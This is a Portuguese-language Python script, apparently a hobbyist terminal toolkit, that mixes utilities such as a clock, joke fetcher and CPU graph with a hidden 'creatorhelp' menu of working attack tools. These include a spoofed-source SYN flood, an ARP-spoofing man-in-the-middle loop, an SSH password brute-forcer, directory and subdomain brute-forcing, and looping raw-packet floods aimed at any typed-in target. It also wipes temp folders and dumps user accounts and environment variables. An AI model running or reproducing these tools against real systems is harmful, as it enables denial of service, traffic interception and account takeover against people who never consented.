# ----------------------
# IMPORTAÇÕES PRINCIPAIS
# ----------------------
from colorama import init, Fore, Back, Style
import os
import time
import random
import string
import re
import json
import socket
import subprocess
import sys
import platform
import getpass
import shutil
import threading
import datetime
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
from collections import defaultdict, deque
from cryptography.fernet import Fernet
from pathlib import Path
from urllib.parse import urljoin

# Rede / Pentest
import nmap
import whois
import requests
import psutil
import pytz
from scapy.layers.inet import IP, TCP, UDP, ICMP

# Gráficos
import matplotlib.pyplot as plt
from matplotlib.animation import FuncAnimation

# Scapy
from scapy.all import IP, TCP, send, sniff, Raw, ARP, rdpcap

# Tenta importar módulos opcionais
try:
    import wmi
except ImportError:
    wmi = None


init(autoreset=True)

COMMON = ["www","dev","test","staging","api","mail","vpn","admin"]

def subdomain_scan(domain, wordlist=None, timeout=3, rate=0.2):
    subs = COMMON[:]
    if wordlist:
        with open(wordlist,"r",encoding="utf-8") as f:
            subs += [l.strip() for l in f if l.strip()]
    found = []
    for s in subs:
        url = f"http://{s}.{domain}"
        try:
            r = requests.head(url, timeout=timeout, allow_redirects=True)
            if r.status_code < 400:
                print(f"[+] {s}.{domain} -> {r.status_code}")
                found.append((s, r.status_code))
        except Exception:
            pass
        time.sleep(rate)
    return found

def dir_brute(base_url, wordlist, threads=5, timeout=5, rate=0.1):
    with open(wordlist, "r", encoding="utf-8") as f:
        words = [w.strip() for w in f if w.strip()]
    results = []
    for w in words:
        url = base_url.rstrip("/") + "/" + w
        try:
            r = requests.get(url, timeout=timeout, allow_redirects=False)
            if r.status_code in (200,301,302,401,403):
                print(f"[{r.status_code}] {url}")
                results.append((url, r.status_code))
        except Exception:
            pass
        time.sleep(rate)
    return results

def handle_client(client_sock, remote_host, remote_port):
    try:
        remote = socket.create_connection((remote_host, remote_port))
    except Exception as e:
        client_sock.close()
        return
    def forward(src, dst):
        try:
            while True:
                data = src.recv(4096)
                if not data:
                    break
                dst.sendall(data)
        except Exception:
            pass
    t1 = threading.Thread(target=forward, args=(client_sock, remote))
    t2 = threading.Thread(target=forward, args=(remote, client_sock))
    t1.start(); t2.start()
    t1.join(); t2.join()
    client_sock.close(); remote.close()

def start_forward(local_port, remote_host, remote_port, bind_addr="0.0.0.0"):
    server = socket.socket()
    server.bind((bind_addr, local_port))
    server.listen(5)
    print(f"[+] Forwarder: {bind_addr}:{local_port} -> {remote_host}:{remote_port}")
    try:
        while True:
            client, addr = server.accept()
            threading.Thread(target=handle_client, args=(client, remote_host, remote_port), daemon=True).start()
    except KeyboardInterrupt:
        print("[*] Forwarder parado.")

def gen_key(path="fernet.key"):
    key = Fernet.generate_key()
    Path(path).write_bytes(key)
    print("[+] Chave gerada em", path)
    return key

def load_key(path="fernet.key"):
    return Path(path).read_bytes()

def encrypt_file(path_in, key_path="fernet.key", out=None):
    key = load_key(key_path)
    f = Fernet(key)
    data = Path(path_in).read_bytes()
    token = f.encrypt(data)
    outp = out or (path_in + ".enc")
    Path(outp).write_bytes(token)
    print("[+] Encrypted ->", outp)

def decrypt_file(path_enc, key_path="fernet.key", out=None):
    key = load_key(key_path)
    f = Fernet(key)
    token = Path(path_enc).read_bytes()
    data = f.decrypt(token)
    outp = out or path_enc.replace(".enc", ".dec")
    Path(outp).write_bytes(data)
    print("[+] Decrypted ->", outp)

def pretty_print_pkt(pkt):
    ts = datetime.datetime.fromtimestamp(pkt.time).isoformat()
    summary = pkt.summary()
    out = f"[{ts}] {summary}"
    # extrair detalhes IP/TCP/UDP se existirem
    if pkt.haslayer(IP):
        out += f" | {pkt[IP].src}:{pkt[IP].dst}"
    if pkt.haslayer(TCP):
        out += f" TCP sport={pkt[TCP].sport} dport={pkt[TCP].dport} flags={pkt[TCP].flags}"
    if pkt.haslayer(UDP):
        out += f" UDP sport={pkt[UDP].sport} dport={pkt[UDP].dport}"
    if pkt.haslayer(ICMP):
        out += " ICMP"
    print(out)

def analyze_live(iface=None, count=50, timeout=None):
    print(f"[*] Capturando {count} pacotes na interface {iface}")
    sniff(iface=iface, prn=pretty_print_pkt, count=count, timeout=timeout, store=False)

def analyze_pcap(path):
    pkts = rdpcap(path)
    for p in pkts:
        pretty_print_pkt(p)

def hash_file(path, alg="sha256"):
    h = hashlib.new(alg)
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()

def hash_string(s, alg="sha256"):
    return hashlib.new(alg, s.encode()).hexdigest()


# Sequência de portas esperada (exemplo)
KNOCK_SEQ = [1111, 2222, 3333]  # você pode mudar
WINDOW = 10  # segundos para completar sequência
WHITELIST = set()  #IPs com acesso liberado

_knock_state = defaultdict(lambda: deque())  # ip -> timestamps/ports

def _process_knock(pkt):
    if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
        return
    sport = pkt[TCP].dport  # porta destino no host (onde o "knock" chega)
    src = pkt[IP].src
    now = time.time()
    dq = _knock_state[src]

    # limpar eventos velhos
    while dq and now - dq[0][1] > WINDOW:
        dq.popleft()

    dq.append((sport, now))
    ports = [p for p,_t in dq]

    # verificar se termina com sequência desejada
    if len(ports) >= len(KNOCK_SEQ) and ports[-len(KNOCK_SEQ):] == KNOCK_SEQ:
        print(f"[KNOCK] Sequência correta de {src} — ação executada")
        WHITELIST.add(src)
        dq.clear()
        # aqui pode rodar comando: os.system("netsh ...") ou outra ação
        # evite ações perigosas automáticas

_knock_sniffer_thread = None
_sniff_running = False

def start_knock_listener(interface=None):
    global _knock_sniffer_thread, _sniff_running
    if _sniff_running:
        print("[!] Knock listener já está rodando.")
        return
    _sniff_running = True
    def _run():
        print("[*] Knock listener iniciado. Pressione Ctrl+C para parar.")
        try:
            sniff(iface=interface, prn=_process_knock, store=False)
        except Exception as e:
            print("[!] Sniffer finalizado:", e)
    _knock_sniffer_thread = threading.Thread(target=_run, daemon=True)
    _knock_sniffer_thread.start()

def stop_knock_listener():
    global _sniff_running
    if _sniff_running:
        _sniff_running = False
        # scapy sniff não tem stop fácil se sem count/timeout; sugerir reiniciar processo
        print("[*] Para parar o sniffer, interrompa o processo (Ctrl+C).")
    else:
        print("[*] Não há listener em execução.")



def payload_generator():
    target_ip = input("TARGET IP: ")
    target_port = int(input("TARGET PORT: "))
    payload_size = int(input("PAYLOAD SIZE (bytes): "))

    payload = "".join(random.choices(string.ascii_letters + string.digits, k=payload_size))
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S") / Raw(load=payload.encode())
    send(packet, loop=True)
    print(f"Payload enviado para {target_ip}:{target_port}")

def traffic_monitor():
    iface = input("INTERFACE: ")
    pkt_count = int(input("NÚMERO DE PACOTES: "))

    def packet_callback(pkt):
        print(pkt.summary())

    sniff(iface=iface, prn=packet_callback, count=pkt_count)

def banner_grabbing():
    target = input("TARGET IP: ")
    port = int(input("PORT: "))
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((target, port))
        banner = s.recv(1024).decode(errors="ignore")
        print(f"Banner: {banner}")
    except Exception as e:
        print(f"Erro: {e}")
    finally:
        s.close()

def whois_lookup():
    domain = input("DOMÍNIO ou IP: ")
    try:
        w = whois.whois(domain)
        print(w)
    except Exception as e:
        print(f"Erro: {e}")

def ssh_brute():
    target = input("TARGET IP: ")
    user = input("USER: ")
    passlist = input("PATH PARA ARQUIVO DE SENHAS: ")
    with open(passlist, "r") as f:
        passwords = f.read().splitlines()

    for password in passwords:
        print(f"Testando {user}:{password}")
        result = os.system(f"sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{target} exit")
        if result == 0:
            print(f"SUCESSO: {user}:{password}")
            break

def geo_ip():
    target_ip = input("IP: ")
    try:
        resp = requests.get(f"http://ip-api.com/json/{target_ip}")
        data = resp.json()
        print(data)
    except Exception as e:
        print(f"Erro: {e}")

def arp_spoof():
    target_ip = input("TARGET IP: ")
    gateway_ip = input("GATEWAY IP: ")

    def spoof(target, spoof_ip):
        packet = ARP(op=2, pdst=target, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
        while True:
            send(packet, verbose=False)
            time.sleep(2)

    thread1 = threading.Thread(target=spoof, args=(target_ip, gateway_ip))
    thread2 = threading.Thread(target=spoof, args=(gateway_ip, target_ip))
    thread1.start()
    thread2.start()

def fuzzer():
    target_ip = input("TARGET IP: ")
    target_port = int(input("PORT: "))
    rate = int(input("RATE (número de pacotes): "))

    for _ in range(rate):
        payload = "".join(random.choices(string.ascii_letters + string.digits, k=32))
        packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S") / Raw(load=payload.encode())
        send(packet, verbose=False)
    print(f"Fuzzing concluído em {target_ip}:{target_port}")

def cmd_dos_interactive():
    try:
        target_ip = input(Fore.YELLOW + "TARGET: ").strip()
        target_port = int(input(Fore.YELLOW + "PORTA: ").strip())
        rate = int(input(Fore.YELLOW + "RATE (pps): ").strip())
    except Exception as e:
        print(Fore.RED + f"Entrada inválida: {e}")
        return

    packet_count = 0
    delay = 1 / rate

    print(Fore.LIGHTBLUE_EX + f"[+] Iniciando SYN Flood em {target_ip}:{target_port} com {rate}pps... (CTRL+C para parar)")

    try:
        while True:
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            src_port = random.randint(1024, 65535)

            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")

            send(packet, verbose=False)
            packet_count += 1

            if packet_count % 100 == 0:
                print(Fore.GREEN + f"[+] Pacotes enviados: {packet_count}")

            time.sleep(delay)

    except KeyboardInterrupt:
        print(Fore.RED + f"\n[!] SYN Flood interrompido. Total de pacotes enviados: {packet_count}")


def sniff_packets(interface=None, count=50):
    """
    Captura pacotes na rede.
    :param interface: interface de rede (ex: "eth0", "Wi-Fi")
    :param count: número de pacotes a capturar
    """
    print(Fore.LIGHTBLUE_EX + f"Iniciando sniffer na interface '{interface}'..." if interface else "Iniciando sniffer na interface padrão...")
    print(Fore.LIGHTGREEN_EX + "Pressione CTRL+C para parar.")

    def process_packet(pkt):
        print(Fore.YELLOW + pkt.summary())  # Mostra resumo do pacote

    sniff(iface=interface, prn=process_packet, count=count)



try:
    import psutil
except:
    print("Erro: instale o psutil com 'pip install psutil'")
try:
    import wmi
except ImportError:
    wmi = None

def temp_pc():
    os_name = platform.system()
    print(Fore.CYAN + "Pressione CTRL+C para sair do monitor de temperatura.\n")

    try:
        if os_name == "Windows":
            try:
                w = wmi.WMI(namespace="root\\wmi")
                temperature_infos = list(w.MSAcpi_ThermalZoneTemperature())
            except Exception as e:
                print(Fore.RED + "Erro ao acessar sensores no Windows:", e)
                return

            if not temperature_infos:
                print(Fore.RED + "Nenhum sensor de temperatura encontrado.")
                return

            while True:
                os.system("cls")
                print(Fore.LIGHTGREEN_EX + "📟 Temperatura do PC (Windows):\n")
                for sensor in temperature_infos:
                    temp_c = (sensor.CurrentTemperature / 10.0) - 273.15
                    print(f" - {sensor.InstanceName}: {temp_c:.1f}°C")
                time.sleep(1)

        elif os_name == "Linux":
            while True:
                temps = psutil.sensors_temperatures()
                os.system("clear")
                print(Fore.LIGHTGREEN_EX + "📟 Temperatura do PC (Linux):\n")
                if not temps:
                    print(Fore.RED + "Nenhum sensor de temperatura detectado.")
                else:
                    for name, entries in temps.items():
                        print(f"[{name}]")
                        for entry in entries:
                            print(f" - {entry.label or 'Sensor'}: {entry.current}°C (Min: {entry.min}°C / Max: {entry.max}°C)")
                time.sleep(1)
        else:
            print(Fore.RED + f"Sistema operacional '{os_name}' não suportado.")
    except KeyboardInterrupt:
        print(Fore.RED + "\nMonitor de temperatura encerrado.")

def clock():
    tz = pytz.timezone("America/Sao_Paulo")
    try:
        print(Fore.CYAN + "Pressione CTRL+C para sair do relógio.\n")
        while True:
            agora = datetime.datetime.now(tz).strftime("%H:%M:%S - %d/%m/%Y")
            print(Fore.LIGHTGREEN_EX + f"\r🕒 Horário de Brasília: {agora}", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\nRelógio encerrado.")

def clear_cache():
    print(Fore.CYAN + "Limpando cache e arquivos temporários...")

    if os.name == "nt":  # Windows
        temp_dirs = [os.getenv("TEMP"), os.getenv("TMP"), "C:\\Windows\\Temp"]
    else:  # Linux/Mac
        temp_dirs = ["/tmp"]

    total_deleted = 0
    for folder in temp_dirs:
        if not folder or not os.path.exists(folder):
            continue
        for root, dirs, files in os.walk(folder):
            for f in files:
                try:
                    file_path = os.path.join(root, f)
                    os.remove(file_path)
                    total_deleted += 1
                except Exception:
                    pass
            for d in dirs:
                try:
                    shutil.rmtree(os.path.join(root, d), ignore_errors=True)
                except Exception:
                    pass

    print(Fore.GREEN + f"Cache limpo com sucesso! ({total_deleted} arquivos apagados)")

def parse_arp_output(arp_text):
    """Retorna lista de tuples (ip, mac) a partir da saída de `arp -a`."""
    entries = []
    ip_re = re.compile(r'(\d{1,3}(?:\.\d{1,3}){3})')
    mac_re = re.compile(r'([0-9A-Fa-f]{2}(?:[:\-][0-9A-Fa-f]{2}){5})')
    lines = arp_text.splitlines()
    for line in lines:
        ip_match = ip_re.search(line)
        mac_match = mac_re.search(line)
        if ip_match and mac_match:
            ip = ip_match.group(1)
            mac = mac_match.group(1)
            entries.append((ip, mac))
    return entries

def reverse_dns(ip, timeout=3):
    try:
        # gethostbyaddr pode bloquear; aqui deixamos o padrão, mas timeout pode ser configurado via socket
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return None

def netbios_name_windows(ip):
    try:
        proc = subprocess.run(["nbtstat", "-A", ip], capture_output=True, text=True, timeout=4)
        out = proc.stdout
        # procura nome com <00> UNIQUE (comum)
        m = re.search(r'^\s*([^ ]+)\s+<00>\s+UNIQUE', out, flags=re.M)
        if m:
            return m.group(1).strip()
        # fallback simples: tenta capturar qualquer nome antes de <20> ou <00>
        m2 = re.search(r'^\s*([^ ]+)\s+<20>\s+UNIQUE', out, flags=re.M)
        if m2:
            return m2.group(1).strip()
    except Exception:
        pass
    return None

def netbios_name_nmblookup(ip):
    # Se nmblookup estiver instalado (Linux), tenta usá-lo
    try:
        proc = subprocess.run(["nmblookup", "-A", ip], capture_output=True, text=True, timeout=4)
        out = proc.stdout + proc.stderr
        m = re.search(r'^\s*([^ ]+)\s+<00>\s+UNIQUE', out, flags=re.M)
        if m:
            return m.group(1).strip()
    except Exception:
        pass
    return None

def try_get_name(ip):
    """Tenta obter nome a partir de várias técnicas."""
    # 1) reverse DNS
    name = reverse_dns(ip)
    if name:
        return name
    # 2) NetBIOS (Windows)
    name = netbios_name_windows(ip)
    if name:
        return name
    # 3) nmblookup (Linux)
    name = netbios_name_nmblookup(ip)
    if name:
        return name
    # 4) poderia adicionar mDNS/zeroconf aqui
    return None

def arp_with_names():
    """Executa arp -a, tenta resolver nomes e imprime tabela."""
    try:
        proc = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=8)
        arp_out = proc.stdout
    except Exception as e:
        print("Erro ao executar 'arp -a':", e)
        return

    entries = parse_arp_output(arp_out)
    if not entries:
        print("Nenhuma entrada ARP encontrada.")
        return

    results = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        future_to_ip = {ex.submit(try_get_name, ip): (ip, mac) for ip, mac in entries}
        for fut in as_completed(future_to_ip):
            ip, mac = future_to_ip[fut]
            try:
                name = fut.result()
            except Exception:
                name = None
            results.append((ip, mac, name or "-"))

    # Ordena por IP e imprime
    results.sort(key=lambda x: tuple(int(part) for part in x[0].split('.')))
    print(f"{'IP':15s} {'MAC':20s} {'NOME':30s}")
    print("-" * 70)
    for ip, mac, name in results:
        print(f"{ip:15s} {mac:20s} {name:30s}")

def collect_system_info():
    data = {}
    # --- Informações básicas do sistema
    data["system"] = {
        "platform": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "hostname": socket.gethostname(),
        "fqdn": socket.getfqdn(),
        "processor": platform.processor(),
        "python_version": platform.python_version()
    }

    # --- Usuários
    try:
        data["current_user"] = getpass.getuser()
    except:
        data["current_user"] = "unknown"

    # Usuários locais
    users = []
    if platform.system().lower() == "windows":
        out, _ = subprocess.Popen(["net", "user"], stdout=subprocess.PIPE).communicate()
        lines = out.decode(errors="ignore").splitlines()
        start = False
        for line in lines:
            if "----" in line:
                start = True
                continue
            if start:
                users += [p.strip() for p in line.split() if p.strip()]
    else:
        try:
            with open("/etc/passwd") as f:
                for ln in f:
                    parts = ln.split(":")
                    if len(parts) >= 3:
                        users.append({"user": parts[0], "uid": parts[2], "info": parts[4].strip()})
        except:
            pass
    data["all_users"] = users

    # Usuários logados
    try:
        data["logged_in_users"] = [
            {"name": u.name, "terminal": u.terminal, "host": u.host, "started": datetime.datetime.fromtimestamp(u.started).isoformat()}
            for u in psutil.users()
        ]
    except:
        data["logged_in_users"] = []

    # --- Hardware
    data["cpu"] = {
        "logical_cores": psutil.cpu_count(logical=True),
        "physical_cores": psutil.cpu_count(logical=False),
        "usage_percent": psutil.cpu_percent(interval=0.5),
        "load_avg": os.getloadavg() if hasattr(os, "getloadavg") else []
    }
    vm = psutil.virtual_memory()
    data["memory"] = {
        "total": vm.total,
        "available": vm.available,
        "percent": vm.percent
    }

    # Discos
    disks = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            disks.append({
                "device": part.device,
                "mountpoint": part.mountpoint,
                "fstype": part.fstype,
                "total": usage.total,
                "used": usage.used,
                "free": usage.free,
                "percent": usage.percent
            })
        except:
            pass
    data["disks"] = disks

    # Rede
    interfaces = {}
    addrs = psutil.net_if_addrs()
    stats = psutil.net_if_stats()
    for iface, addr_list in addrs.items():
        interfaces[iface] = {
            "isup": stats[iface].isup if iface in stats else None,
            "addresses": [{"family": str(a.family), "address": a.address, "netmask": a.netmask} for a in addr_list]
        }
    data["network_interfaces"] = interfaces

    # Uptime
    boot = datetime.datetime.fromtimestamp(psutil.boot_time())
    now = datetime.datetime.now()
    data["uptime"] = {
        "boot_time": boot.isoformat(),
        "uptime_seconds": int((now - boot).total_seconds())
    }

    # Processos principais
    procs = []
    for p in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
        try:
            mem = p.info.get('memory_info')
            procs.append({
                "pid": p.info.get('pid'),
                "name": p.info.get('name'),
                "user": p.info.get('username'),
                "cpu": p.info.get('cpu_percent'),
                "mem_rss": mem.rss if mem else None,
            })
        except:
            continue
    procs.sort(key=lambda x: x.get('mem_rss') or 0, reverse=True)
    data["top_processes"] = procs[:15]

    # Variáveis de ambiente
    data["env"] = {k: os.environ[k] for k in list(os.environ)[:50]}  # Limitar para não poluir

    return data

def cmd_sysinfo():
    print(Fore.LIGHTBLUE_EX + "Coletando informações do sistema... Isso pode levar alguns segundos.")
    info = collect_system_info()
    print(json.dumps(info, indent=2, ensure_ascii=False))

def matrix():
    try:
        columns = os.get_terminal_size().columns
    except OSError:
        columns = 80

    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()"
    try:
        while True:
            line = "".join(random.choice(chars) for _ in range(columns))
            print("\033[92m" + line)  # Verde Matrix
            time.sleep(0.05)
    except KeyboardInterrupt:
        print("\n" + Fore.RED + "Matrix finalizada.")

import requests


def joke():
    try:
        resp = requests.get("https://api.chucknorris.io/jokes/random?category=dev")
        if resp.status_code == 200:
            data = resp.json()
            print(Fore.LIGHTGREEN_EX + data.get("value"))
        else:
            print(Fore.RED + "Não foi possível buscar uma piada agora.")
    except Exception as e:
        print(Fore.RED + f"Erro: {e}")


def system_stats_graph():
    cpu_data = []
    mem_data = []
    times = []

    fig, ax = plt.subplots()
    ax.set_title("Uso de CPU e Memória em tempo real")
    ax.set_xlabel("Tempo (s)")
    ax.set_ylabel("Percentual (%)")

    cpu_line, = ax.plot([], [], label="CPU")
    mem_line, = ax.plot([], [], label="RAM")

    def update(frame):
        cpu = psutil.cpu_percent()
        mem = psutil.virtual_memory().percent
        cpu_data.append(cpu)
        mem_data.append(mem)
        times.append(len(cpu_data))

        cpu_line.set_data(times, cpu_data)
        mem_line.set_data(times, mem_data)
        ax.relim()
        ax.autoscale_view()

        ax.legend()
        return cpu_line, mem_line

    ani = FuncAnimation(fig, update, interval=1000)
    plt.show()


# -------------------------
# Interface principal
# -------------------------
print(Fore.RED + r''' /$$      /$$  /$$$$$$  /$$$$$$$  /$$$$$$$$ /$$   /$$ /$$   /$$        /$$$$$$  /$$      /$$ /$$$$$$$ 
| $$$    /$$$ /$$__  $$| $$__  $$| $$_____/| $$  | $$| $$  / $$       /$$__  $$| $$$    /$$$| $$__  $$
| $$$$  /$$$$| $$  \ $$| $$  \ $$| $$      | $$  | $$|  $$/ $$/      | $$  \__/| $$$$  /$$$$| $$  \ $$
| $$ $$/$$ $$| $$$$$$$$| $$$$$$$/| $$$$$   | $$  | $$ \  $$$$/       | $$      | $$ $$/$$ $$| $$  | $$
| $$  $$$| $$| $$__  $$| $$__  $$| $$__/   | $$  | $$  >$$  $$       | $$      | $$  $$$| $$| $$  | $$
| $$\  $ | $$| $$  | $$| $$  \ $$| $$      | $$  | $$ /$$/\  $$      | $$    $$| $$\  $ | $$| $$  | $$
| $$ \/  | $$| $$  | $$| $$  | $$| $$$$$$$$|  $$$$$$/| $$  \ $$      |  $$$$$$/| $$ \/  | $$| $$$$$$$/
|__/     |__/|__/  |__/|__/  |__/|________/ \______/ |__/  |__/       \______/ |__/     |__/|_______/ 
                                                                                                      
                                                                                                      
                                                                                                     ''')
print(Fore.LIGHTGREEN_EX + "Bem vindo ao CMD desenvolvido por MareuX!")
while True:
    ask = str(input(Fore.YELLOW + "prompt: ")).strip()

    if ask.lower() == 'cmd':
        while True:
            cmd = input(Fore.GREEN + "> ")
            if cmd.lower() in ('exit', 'sair'):
                print(Fore.RED + "Saindo do CMD...")
                time.sleep(1)
                break
            os.system(cmd)

    elif ask.lower() == "help":
        print(Fore.LIGHTBLUE_EX + '''Comandos disponíveis:
  cmd          - Abre o CMD feito por MareuX
  ips -n       - Lista IPs do ARP com nomes via reverse-dns/NetBIOS
  sysinfo      - Mostra informações do sistema
  matrix       - Efeito estilo Matrix no terminal
  piadoca      - Conta uma piada aleatória
  statspc      - Mostra gráficos em tempo real de CPU e RAM
  limparcache  - Limpa cache e arquivos temporários do sistema
  relogio      - Mostra horário de Brasília em tempo real
  cls / clear  - Limpa o terminal
  host -tpc    - Mostra temperaturas do PC em tempo real
  geo          - Mostra localização geográfica por IP
''')

    elif ask.lower() == "creatorhelp":
        print(Fore.LIGHTRED_EX + '''Comandos de invasão disponíveis:
  dos        - Realiza SYN Flood (ataque DoS)
  arpspoof   - Ataque ARP Spoofing (MITM)
  sshbrute   - Força bruta SSH
  payload    - Envia pacotes customizados
  fuzzer     - Fuzzer para teste de portas
  dirbrute   - Brute force de diretórios/URLs
  subscan    - Scan de subdomínios
  forward    - Port forwarding
  knocklisten- Escuta knock sequences
  knockstatus- Mostra status do knock listener
  sniff      - Captura pacotes na rede
  monitor    - Monitor de tráfego em tempo real
  banner     - Banner grabbing
  whois      - Consulta WHOIS
''')

    elif ask.lower() == 'sacan':
        try:
            nm = nmap.PortScanner()
        except Exception as e:
            print("Erro ao inicializar nmap.PortScanner():", e)
            print("Verifique se o nmap está instalado e no PATH.")
            continue

        target = input("Alvo: ").strip()
        try:
            print("Iniciando scan (todas as portas). Pode demorar...")
            nm.scan(hosts=target, arguments='-p- -T4')
        except Exception as e:
            print("Erro ao executar nmap:", e)
            continue

        for host in nm.all_hosts():
            try:
                hostname = nm[host].hostname() or "-"
                state = nm[host]['status']['state']
                print(f"{host}\t{hostname}\t{state}")
                # Se quiser listar portas abertas:
                tcpinfo = nm[host].get('tcp', {})
                if tcpinfo:
                    for port in sorted(tcpinfo.keys()):
                        info = tcpinfo[port]
                        print(f"  Porta {port}: {info.get('state','-')} {info.get('name','')}")
            except Exception:
                pass

    elif ask.lower() == 'ips -n':
        # chama a função que faz arp + nomes
        arp_with_names()

    elif ask.lower() in ('exit', 'sair', 'quit'):
        print(Fore.RED + "Encerrando programa...")
        time.sleep(1)
        break
    elif ask.lower() == 'sysinfo':
        cmd_sysinfo()
    elif ask.lower() == 'matrix':
        matrix()
    elif ask.lower() == 'piadoca':
        joke()
    elif ask.lower() == 'statspc':
        system_stats_graph()
    elif ask == 'cls' or ask == 'clear':
        os.system('cls')
    elif ask.lower() == 'limparcache':
        clear_cache()
    elif ask.lower() == 'relogio':
        clock()
    elif ask.lower() == 'host -tpc':
        temp_pc()
    elif ask.lower() == "dos":
        cmd_dos_interactive()
    elif ask.lower() == "dirbrute":
        base = input("BASE URL (http(s)://domain): ")
        wl = input("WORDLIST PATH: ")
        dir_brute(base, wl)
    elif ask.lower().startswith("subscan"):
        domain = input("DOMAIN: ")
        wl = input("WORDLIST (enter para usar comum): ").strip() or None
        subdomain_scan(domain, wl)
    elif ask.lower().startswith("forward"):
    # interactive: pedir local, remote host/port
        lp = int(input("LOCAL PORT: "))
        rh = input("REMOTE HOST: ")
        rp = int(input("REMOTE PORT: "))
        threading.Thread(target=start_forward, args=(lp, rh, rp), daemon=True).start()
    elif ask.lower().startswith("genkey"):
        gen_key()
    elif ask.lower().startswith("encrypt "):
        parts = ask.split()
        encrypt_file(parts[1])
    elif ask.lower().startswith("decrypt "):
        parts = ask.split()
        decrypt_file(parts[1])
    elif ask.lower().startswith("hashstr "):
        _, alg, *rest = ask.split()
        s = " ".join(rest)
        print(hash_string(s, alg))
    elif ask.lower().startswith("hash "):
        _, alg, path = ask.split()
        print(hash_file(path, alg))
    elif ask.lower().startswith("analyze"):
        parts = ask.split()
        if len(parts) == 1:
            analyze_live(count=50)
        elif len(parts) == 2:
            analyze_pcap(parts[1])
        else:
            analyze_live(iface=parts[1], count=int(parts[2]))
    elif ask.lower() == "knocklisten":
        start_knock_listener()   # requer scapy e permissão de admin
    elif ask.lower() == "knockstatus":
        print("Whitelist:", WHITELIST)

    elif ask.lower().startswith("sniff"):
        parts = ask.split()
        iface = None
        count = 50

        if len(parts) >= 2:
            iface = parts[1]
        if len(parts) == 3:
            try:
                count = int(parts[2])
            except:
                print(Fore.RED + "Número inválido de pacotes.")
                continue

        try:
            sniff_packets(iface, count)
        except Exception as e:
            print(Fore.RED + f"Erro no sniff: {e}")

    elif ask.lower().startswith("ssh "):
        comando_ssh = ask[4:].strip()  # Pega tudo após "ssh "
        if not comando_ssh:
            print(Fore.RED + "Uso: ssh usuario@ip")
        else:
            try:
                print(Fore.LIGHTBLUE_EX + f"Abrindo conexão SSH: {comando_ssh}")
                os.system(f"ssh {comando_ssh}")
            except Exception as e:
                print(Fore.RED + f"Erro ao abrir SSH: {e}")
    elif ask.lower() == "payload":
        payload_generator()
    elif ask.lower() == "monitor":
        traffic_monitor()
    elif ask.lower() == "banner":
        banner_grabbing()
    elif ask.lower() == "whois":
        whois_lookup()
    elif ask.lower() == "sshbrute":
            ssh_brute()
    elif ask.lower() == "geo":
        geo_ip()
    elif ask.lower() == "arpspoof":
        arp_spoof()
    elif ask.lower() == "fuzzer":
        fuzzer()

    else:
        print(Fore.RED + f"Comando '{ask}' é inválido ou inoperável! Se tiver dúvidas, digite help.")
